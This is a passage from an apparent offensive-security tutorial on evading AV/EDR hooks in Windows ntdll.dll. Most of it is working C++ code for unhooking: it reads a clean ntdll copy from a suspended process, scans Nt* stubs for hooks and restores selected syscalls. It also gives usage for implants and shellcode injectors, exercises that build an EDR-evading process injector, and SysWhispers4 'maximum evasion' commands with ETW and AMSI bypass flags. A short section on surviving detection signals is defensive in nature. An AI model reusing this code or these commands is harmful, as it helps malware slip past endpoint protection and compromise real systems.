**Result in a debugger:** Before — `NtCreateThread` starts with `E9 ...` (JMP to EDR). After — `NtCreateThread` starts with `4C 8B D1` (original `mov r10, rcx`).

### Problem with Fresh Copy

Reading `ntdll.dll` directly from disk is **easily detected** by AV/EDR products. Most security products monitor file access to system DLLs. Opening `C:\Windows\System32\ntdll.dll` from inside a process immediately flags suspicious behavior.

This is exactly what Technique 04 solves.

---

## Technique 04 — Perun Farts (Clean ntdll from Suspended Process)

### The Simple Analogy

Instead of going to the library to get a clean copy (which the guard watches), you borrow the rulebook from a brand new employee who just arrived but hasn't been "briefed" by the guard yet. The new employee's copy is clean.

### The Key Insight

When a process is created in **suspended state**, the Windows loader has already mapped `ntdll.dll` into the new process — but the main thread hasn't started. That means:

- The EDR's kernel callback fires when a new process is created
- BUT: the EDR's DLL injection into the new process happens via APC, which runs on a thread start
- The suspended process has no running thread yet → EDR DLL hasn't executed → ntdll hooks not installed

```
┌──────────────────────────────────────────────────────────────────────────┐
│              Fresh Copy vs. Perun Farts — Source of Clean ntdll         │
│                                                                          │
│  Fresh Copy:                              Perun Farts:                   │
│  ┌──────────────────────────────┐        ┌──────────────────────────┐   │
│  │  Read from C:\Windows\       │        │  Read from suspended      │   │
│  │  System32\ntdll.dll (disk)   │        │  process memory          │   │
│  │  ❌ AV monitors file access  │        │  (no disk access at all) │   │
│  │  ❌ Easy to detect            │        │  ✅ Much harder to detect │   │
│  └──────────────────────────────┘        └──────────────────────────┘   │
└──────────────────────────────────────────────────────────────────────────┘
```

### The Code

```cpp
int main(void) {
    STARTUPINFOA startupInfo = { 0 };
    PROCESS_INFORMATION processInfo = { 0 };

    // 1. Spawn cmd.exe in suspended state — no thread runs, no EDR DLL loaded
    BOOL createSuccess = CreateProcessA(
        NULL, (LPSTR)"cmd.exe",
        NULL, NULL, FALSE,
        CREATE_SUSPENDED | CREATE_NEW_CONSOLE,  // <-- suspended!
        NULL, "C:\\Windows\\System32\\",
        &startupInfo, &processInfo
    );

    // 2. Get the size of ntdll.dll from our own process's PE headers
    char* pNtdllAddress = (char*)GetModuleHandle(L"ntdll.dll");
    IMAGE_DOS_HEADER* pDosHeader = (IMAGE_DOS_HEADER*)pNtdllAddress;
    IMAGE_NT_HEADERS* pNTHeader  = (IMAGE_NT_HEADERS*)
        (pNtdllAddress + pDosHeader->e_lfanew);
    SIZE_T ntdllSize = pNTHeader->OptionalHeader.SizeOfImage;

    // 3. Allocate a buffer to hold the clean copy
    LPVOID pCache = VirtualAlloc(NULL, ntdllSize, MEM_COMMIT, PAGE_READWRITE);

    // 4. Read the CLEAN ntdll from the suspended process
    SIZE_T bytesRead = 0;
    ReadProcessMemory(
        processInfo.hProcess,  // handle to suspended process
        pNtdllAddress,         // same base address (shared pages)
        pCache,                // our local buffer
        ntdllSize,             // size
        &bytesRead
    );

    // 5. Kill the suspended process — we got what we needed
    TerminateProcess(processInfo.hProcess, 0);

    // 6. Use the clean cache to remove hooks from our own ntdll
    RemoveHookFromNtdll(GetModuleHandle(sNtdllW), pCache);

    VirtualFree(pCache, 0, MEM_RELEASE);
    return 0;
}
```

### Surgical Syscall Region Copy

Instead of copying the entire `.text` section (like Fresh Copy), Perun Farts only copies the **syscall stub region** — the bytes between the first `syscall; ret` sequence and the last one:

```cpp
int LocateFirstSyscall(char* pMem, DWORD size) {
    // Find the byte pattern: 0F 05 C3 = syscall ; ret
    BYTE pattern1[] = "\x0f\x05\xc3";
    // Then scan backward for: CC CC CC = three int3 padding bytes (function boundary)
    BYTE pattern2[] = "\xcc\xcc\xcc";
    // First syscall stub starts right AFTER the padding
}

int LocateLastSysCall(char* pMem, DWORD size) {
    // Find: 0F 05 C3 CD 2E C3 CC CC CC
    //       syscall ret int2e ret int3*3
    // This is the last complete stub + its trailing padding
    BYTE pattern[] = "\x0f\x05\xc3\xcd\x2e\xc3\xcc\xcc\xcc";
}
```

```
┌──────────────────────────────────────────────────────────────────────────┐
│              Perun Farts — Surgical Copy vs. Entire .text                │
│                                                                          │
│  Fresh Copy: copy entire .text section                                  │
│  ┌───────────────────────────────────────────────────────────────────┐  │
│  │ [helper code] [syscall stubs] [more code] [string data] [...]    │  │
│  │ ←───────────────── memcpy whole thing ──────────────────────────► │  │
│  └───────────────────────────────────────────────────────────────────┘  │
│                                                                          │
│  Perun Farts: copy only the syscall stub region                         │
│  ┌───────────────────────────────────────────────────────────────────┐  │
│  │ [helper code] [CC CC CC][syscall stubs][CC CC CC] [more code]   │  │
│  │               ↑ LocateFirst          ↑ LocateLast               │  │
│  │               └───── only this range ────────────┘               │  │
│  └───────────────────────────────────────────────────────────────────┘  │
│                                                                          │
│  Result: less memory written, harder to detect, same effect             │
└──────────────────────────────────────────────────────────────────────────┘
```

---

## Technique 05 — Unhook Detected Hooks (Scan First, Restore Selectively)

### The Simple Analogy

Instead of replacing every page of the rulebook (which the guard might notice), you first figure out exactly which pages the guard tampered with — then replace only those specific pages. Everything else stays untouched.

### The Detection Logic

A clean stub always starts with `0x4C` (`mov r10, rcx`). If byte 0 is anything else, the stub is hooked:

```cpp
// DetectHooks.h — scan all Nt* functions, return only the hooked ones
std::unordered_map<std::string, unsigned long> DetectHooks(HMODULE hNtdll) {
    std::unordered_map<std::string, unsigned long> hookedOffsets;

    // Navigate PE headers from the module base (no Win32 API calls)
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)
        ((BYTE*)hNtdll + dosHeader->e_lfanew);

    DWORD exportDirRVA = ntHeaders->OptionalHeader
        .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    PIMAGE_EXPORT_DIRECTORY exportDir =
        (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hNtdll + exportDirRVA);

    DWORD* namesRVA = (DWORD*)((BYTE*)hNtdll + exportDir->AddressOfNames);
    DWORD* funcsRVA = (DWORD*)((BYTE*)hNtdll + exportDir->AddressOfFunctions);
    WORD*  ordinals = (WORD* )((BYTE*)hNtdll + exportDir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        const char* name = (const char*)((BYTE*)hNtdll + namesRVA[i]);

        // Only check Nt* syscall stubs
        if (name[0] != 'N' || name[1] != 't') continue;

        DWORD funcRVA  = funcsRVA[ordinals[i]];
        BYTE* funcAddr = (BYTE*)hNtdll + funcRVA;

        // 0x4C = first byte of clean "mov r10, rcx"
        // Anything else means EDR overwrote this stub
        if (funcAddr[0] != 0x4C) {
            std::cout << "[HOOKED] " << name
                      << " (byte 0 = 0x" << std::hex << (int)funcAddr[0] << ")\n";
            hookedOffsets[name] = funcRVA;
        }
    }
    return hookedOffsets;
}
```

### Restore Only the Detected Stubs

```cpp
void RestoreHookedSyscalls(
    BYTE* localNtdllBase,
    const std::unordered_map<std::string, unsigned long>& hookedOffsets,
    const std::vector<SyscallStubInfo>& syscallStubs,
    SIZE_T moduleSize,
    BYTE* cleanBuffer)
{
    DWORD oldProtect = 0;

    for (auto it = hookedOffsets.begin(); it != hookedOffsets.end(); ++it) {
        const std::string& funcName = it->first;

        // Find the matching clean stub from the suspended process buffer
        const SyscallStubInfo* cleanStub = NULL;
        for (size_t i = 0; i < syscallStubs.size(); ++i) {
            if (syscallStubs[i].functionName == funcName) {
                cleanStub = &syscallStubs[i];
                break;
            }
        }
        if (!cleanStub) continue;

        SIZE_T cleanSize  = cleanStub->nextStubOffset - cleanStub->stubOffset;
        BYTE*  targetAddr = localNtdllBase + cleanStub->stubOffset;

        // Make writable → copy clean bytes → restore protection → flush CPU cache
        VirtualProtect(targetAddr, cleanSize, PAGE_EXECUTE_READWRITE, &oldProtect);
        memcpy(targetAddr, cleanBuffer + cleanStub->stubOffset, cleanSize);
        VirtualProtect(targetAddr, cleanSize, oldProtect, &oldProtect);
        FlushInstructionCache(GetCurrentProcess(), targetAddr, cleanSize);  // ← critical!

        std::cout << "[+] Restored: " << funcName << "\n";
    }
}
```

> `FlushInstructionCache` — Without this, the CPU might continue executing from its cached version of the old, hooked bytes even after the memory has been patched. Always call this after patching executable memory.
{: .prompt-warning }

### Full Flow

```cpp
int main() {
    HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");

    // Step 1: Detect which functions are hooked RIGHT NOW
    auto hookedOffsets = DetectHooks(hNtdll);

    if (hookedOffsets.empty()) {
        std::cout << "[*] No hooks found. Clean system.\n";
        return 0;
    }
    std::cout << "[*] Hooks found: " << hookedOffsets.size() << "\n";

    // Step 2: Get a clean ntdll from a suspended process
    HANDLE hProcess = createBenignProcess();  // spawns notepad.exe suspended

    // Step 3: Read clean syscall stubs from the suspended process
    std::vector<BYTE> cleanBuffer;
    std::vector<SyscallStubInfo> syscallStubs = GetSyscallStubs(hProcess, &cleanBuffer);

    // Step 4: Restore ONLY the hooked stubs
    MODULEINFO modInfo = { 0 };
    GetModuleInformation(GetCurrentProcess(), hNtdll, &modInfo, sizeof(modInfo));
    RestoreHookedSyscalls((BYTE*)modInfo.lpBaseOfDll, hookedOffsets,
                          syscallStubs, modInfo.SizeOfImage, cleanBuffer.data());

    // Step 5: Clean up
    TerminateProcess(hProcess, 0);
    CloseHandle(hProcess);
    return 0;
}
```

---

## Technique 06 — Unhook Desired Hooks (You Choose Exactly What to Fix)

### The Simple Analogy

You know exactly which three pages of the rulebook the guard tampered with. You go straight to pages 47, 83, and 112, replace only those. Every other page is untouched. You don't even need to read the whole book first.

### Usage

```powershell
# Restore only the two functions your implant uses
UnhookDesiredHooks.exe NtCreateThread,NtOpenFile

# Restore exactly what a shellcode injector needs
UnhookDesiredHooks.exe NtAllocateVirtualMemory,NtWriteVirtualMemory,NtCreateThreadEx
```

### Key Difference from Technique 05

```
┌──────────────────────────────────────────────────────────────────────────┐
│              Technique 05 vs. Technique 06                               │
│                                                                          │
│  Technique 05 — Unhook Detected:                                        │
│  1. Scan all Nt* exports → find which ones are hooked                   │
│  2. Restore those specific ones                                          │
│  Useful when: you don't know in advance which functions are hooked      │
│                                                                          │
│  Technique 06 — Unhook Desired:                                         │
│  1. Skip detection entirely                                              │
│  2. Restore exactly the functions you specify (even if not hooked)      │
│  Useful when: you know exactly which functions your code calls          │
│  Benefit: no scanning = smallest possible footprint                     │
└──────────────────────────────────────────────────────────────────────────┘
```

### Nt vs. Zw Prefix Problem

Windows exports both `NtCreateThread` and `ZwCreateThread` — they map to the same syscall. A user might pass either form. The clean buffer might label it with the other prefix. Solution: strip the prefix before comparing:

```cpp
std::string normalize_function_name(const std::string& name) {
    // NtCreateThread → CreateThread
    // ZwCreateThread → CreateThread
    // Both become identical for comparison
    if (name.size() > 2)
        return name.substr(2);  // strip "Nt" or "Zw"
    return name;
}
```

### The Restore Function

```cpp
void RestoreHookedSyscalls(
    BYTE* localNtdllBase,
    const std::unordered_map<std::string, unsigned long>& hookedOffsets,
    const std::vector<SyscallStubInfo>& syscallStubs,
    SIZE_T moduleSize,
    BYTE* cleanBuffer)
{
    DWORD oldProtect = 0;

    for (auto it = hookedOffsets.begin(); it != hookedOffsets.end(); ++it) {
        const std::string& funcName = it->first;
        std::string normalizedTarget = normalize_function_name(funcName);

        // Find matching clean stub (with prefix normalization)
        const SyscallStubInfo* cleanStub = NULL;
        for (size_t i = 0; i < syscallStubs.size(); ++i) {
            std::string normalizedStub =
                normalize_function_name(syscallStubs[i].functionName);
            if (normalizedStub == normalizedTarget) {
                cleanStub = &syscallStubs[i];
                break;
            }
        }

        if (!cleanStub) {
            std::cout << "[!] No clean stub found for: " << funcName << "\n";
            continue;
        }

        SIZE_T cleanSize  = cleanStub->nextStubOffset - cleanStub->stubOffset;
        BYTE*  targetAddr = localNtdllBase + cleanStub->stubOffset;

        // Bounds check before writing
        if (cleanSize == 0 || (cleanStub->stubOffset + cleanSize) > moduleSize)
            continue;

        if (!VirtualProtect(targetAddr, cleanSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
            std::cerr << "[!] VirtualProtect failed for: " << funcName << "\n";
            continue;  // don't crash, skip and continue
        }

        memcpy(targetAddr, cleanBuffer + cleanStub->stubOffset, cleanSize);

        DWORD dummy = 0;
        VirtualProtect(targetAddr, cleanSize, oldProtect, &dummy);
        FlushInstructionCache(GetCurrentProcess(), targetAddr, cleanSize);

        std::cout << "[+] Restored: " << funcName << "\n";
    }
}
```

**Example run output:**
```
Z:\> UnhookDesiredHooks.exe NtCreateThread,NtOpenFile
Target function: NtCreateThread
Target function: NtOpenFile
[+] Restored: NtCreateThread
[+] Restored: NtOpenFile
```

Before: both functions start with `E9 ...` (BitDefender JMP hook).
After: both functions start with `4C 8B D1` (original `mov r10, rcx`). Everything else in `ntdll.dll` is untouched.

---

## All Six Techniques — Comparison Table

```
┌──────────────────────────────────────────────────────────────────────────┐
│              All Six Techniques — At a Glance                            │
├────────┬──────────────────┬────────────────┬──────────┬──────────────────┤
│ #      │ Technique        │ What Restored  │ Mem      │ Best For         │
│        │                  │                │ Writes   │                  │
├────────┼──────────────────┼────────────────┼──────────┼──────────────────┤
│ 01     │ Direct Syscalls  │ Nothing        │ None     │ Skip ntdll       │
│        │ (SysWhispers4)   │ (bypass only)  │          │ entirely         │
├────────┼──────────────────┼────────────────┼──────────┼──────────────────┤
│ 02     │ Hell's Gate      │ Nothing        │ None     │ Runtime SSN      │
│        │                  │ (bypass only)  │          │ resolution       │
├────────┼──────────────────┼────────────────┼──────────┼──────────────────┤
│ 03     │ Fresh Copy       │ Entire .text   │ Very     │ Quick PoC,       │
│        │                  │ section        │ large    │ full removal     │
├────────┼──────────────────┼────────────────┼──────────┼──────────────────┤
│ 04     │ Perun Farts      │ Syscall stub   │ Medium   │ Fileless,        │
│        │                  │ region only    │          │ targeted         │
├────────┼──────────────────┼────────────────┼──────────┼──────────────────┤
│ 05     │ Unhook Detected  │ Only hooks     │ Small    │ Unknown hook     │
│        │                  │ found at scan  │          │ targets          │
├────────┼──────────────────┼────────────────┼──────────┼──────────────────┤
│ 06     │ Unhook Desired   │ Only functions │ Minimal  │ Surgical,        │
│        │                  │ you specify    │          │ known targets    │
└────────┴──────────────────┴────────────────┴──────────┴──────────────────┘
```

---

## Detection Signals That Survive All of These Techniques

```
┌──────────────────────────────────────────────────────────────────────────┐
│              What Still Gets You After Userland Unhooking               │
│                                                                          │
│  Signal                      Layer           Why It Survives            │
│  ──────────────────────────────────────────────────────────────────────  │
│  PsSetCreateProcessNotify    Kernel callback  Fires in kernel, no        │
│  PsSetCreateThreadNotify     Kernel callback  userland can stop it       │
│  ObRegisterCallbacks         Kernel callback                             │
│                                                                          │
│  ETW-TI events               Kernel ETW       Kernel-originated          │
│  (mem alloc, thread create)                   telemetry pipeline         │
│                                                                          │
│  Syscall origin check        EDR heuristic    RIP at kernel entry        │
│  (RIP ∉ ntdll.dll region)                     points to your PE,        │
│                                               not ntdll                  │
│  → Solution: use INDIRECT syscalls (Technique 01, randomized method)    │
│                                                                          │
│  PEB walk / PE parsing       Behavioral rule  Unusual memory access      │
│  visible in ETW              detection        patterns                   │
└──────────────────────────────────────────────────────────────────────────┘
```

---

## Exercises

### Challenge 1 — Hell's Gate + Direct Syscall Injector

Build a process injector using only direct syscalls with SSNs resolved at runtime via Hell's Gate. Requirements:

- Implement Hell's Gate from scratch: parse the ntdll export table, walk to each stub, extract the SSN from bytes 4-5
- Handle the hooked stub case using Halo's Gate (count neighbors to infer SSN)
- Use at minimum: `NtOpenProcess`, `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, `NtProtectVirtualMemory`, `NtCreateThreadEx` — all through your own assembly stubs
- Must work even when an EDR has hooked one or more of those functions

> **Hint:** Byte pattern for clean stub: `4C 8B D1 B8 ?? ?? 00 00`. SSN is at offset 4-5 (little-endian). If byte 0 is `E9` (hooked), scan forward to the next clean stub, then subtract the number of positions skipped.
{: .prompt-tip }

### Challenge 2 — Selective Unhooker with Kernel Callback Proof

Build a tool combining Technique 06 (Unhook Desired) that also demonstrates kernel callbacks still fire. Requirements:

- Accept comma-separated function names as argv[1], restore using a suspended `svchost.exe` as the clean source
- Print the first 8 bytes of each function before and after in hex
- After unhooking, call `NtCreateThreadEx` and capture evidence (Process Monitor or kernel debugger) that the EDR's kernel callback still fires
- Document 2+ detection signals that survive userland unhooking

> **Hint:** Use `svchost.exe -k netsvcs` as the suspended process. For kernel callback evidence, a debugger breakpoint on `nt!PspCallThreadNotifyRoutines` fires regardless of userland hook status.
{: .prompt-tip }

---

## Quick Reference Cheat Sheet

```
┌──────────────────────────────────────────────────────────────────────────┐
│              AV/EDR Hook Evasion — Quick Reference                       │
│                                                                          │
│  ── DETECT HOOKS ───────────────────────────────────────────────────── │
│                                                                          │
│  // Byte 0 of a clean stub = 0x4C (mov r10, rcx)                        │
│  // Byte 0 = 0xE9 or 0xFF or 0xEB → hooked (JMP instruction)            │
│                                                                          │
│  ── TECHNIQUE SELECTION ─────────────────────────────────────────────── │
│                                                                          │
│  "I don't know which functions are hooked"                               │
│  → Technique 05: DetectHooks() → RestoreHookedSyscalls()                │
│                                                                          │
│  "I know exactly which functions my code calls"                          │
│  → Technique 06: UnhookDesiredHooks.exe Nt...,Nt...,Nt...               │
│                                                                          │
│  "I want to skip ntdll entirely, zero memory writes"                    │
│  → Technique 01: SysWhispers4 + SW4_ function wrappers                  │
│                                                                          │
│  "I need runtime SSN resolution, low complexity"                         │
│  → Technique 02: Hell's Gate GetVxTableEntry + HellDescent              │
│                                                                          │
│  "I need to unook but can't touch disk"                                  │
│  → Technique 04: Perun Farts (suspended process as clean source)        │
│                                                                          │
│  ── SYSWHISPERS4 QUICK COMMANDS ─────────────────────────────────────── │
│                                                                          │
│  # Generate common functions (default settings)                          │
│  python syswhispers.py --preset common                                   │
│                                                                          │
│  # Indirect syscalls + Tartarus' Gate resolution                         │
│  python syswhispers.py --preset injection --method indirect              │
│    --resolve tartarus                                                    │
│                                                                          │
│  # Specific functions only                                               │
│  python syswhispers.py --functions                                       │
│    NtAllocateVirtualMemory,NtCreateThreadEx,NtWriteVirtualMemory        │
│                                                                          │
│  # Maximum evasion preset                                                │
│  python syswhispers.py --preset stealth --method randomized              │
│    --resolve recycled --obfuscate --encrypt-ssn --stack-spoof            │
│    --etw-bypass --amsi-bypass --anti-debug                               │
│                                                                          │
│  ── KEY BYTE PATTERNS ────────────────────────────────────────────────── │
│                                                                          │
│  Clean stub:   4C 8B D1  B8 ?? ?? 00 00  0F 05  C3                      │
│                mov r10   mov eax,SSN     syscall ret                     │
│                                                                          │
│  Hooked stub:  E9 ?? ?? ?? ??  (near JMP to EDR DLL)                    │
│            or: FF 25 ?? ?? ?? ?? (indirect JMP via pointer)              │
│                                                                          │
│  SSN location: bytes 4-5 of a clean stub (little-endian WORD)           │
│                                                                          │
│  ── SUSPENDED PROCESS PATTERN ───────────────────────────────────────── │
│                                                                          │
│  CreateProcessA(NULL, "notepad.exe", ...,                                │
│    CREATE_SUSPENDED | CREATE_NEW_CONSOLE, ...)                           │
│  → ReadProcessMemory(hProcess, ntdllBase, pCache, ntdllSize, &read)     │
│  → TerminateProcess(hProcess, 0)                                         │
│  → Use pCache as source for clean stub restoration                       │
└──────────────────────────────────────────────────────────────────────────┘
```

---

## References

- [SysWhispers4 on GitHub](https://github.com/JoasASantos/SysWhispers4)
- [Hell's Gate — Original Paper and PoC](https://github.com/am0nsec/HellsGate)
- [Certified Pre-Owned — SpecterOps](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)
- [0x12 Dark Development — AV & EDR Hooking Evasion](https://0x12darkdev.net)
- [Microsoft Docs — NtAllocateVirtualMemory](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntallocatevirtualmemory)
- [j00ru Windows Syscall Tables](https://j00ru.vexillium.org/syscalls/nt/64/)
- [x64dbg Debugger](https://x64dbg.com/)
- [Microsoft Docs — ETW Threat Intelligence Provider](https://docs.microsoft.com/en-us/windows/win32/etw/about-event-tracing)
